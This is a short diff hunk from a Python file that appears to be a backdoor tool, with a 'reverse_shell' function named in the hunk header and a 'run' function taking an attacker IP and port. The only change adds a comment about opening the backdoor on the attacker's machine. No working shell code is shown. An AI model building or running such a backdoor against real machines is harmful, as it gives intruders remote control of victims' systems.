@@ -42,7 +42,7 @@ def reverse_shell(host, port):
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
-
+# Command to open the backdoor on attacker's machine: 
 def run(atk_ip: str, atk_port: str):
     print("[+] Backdoor module starting...")
     try:
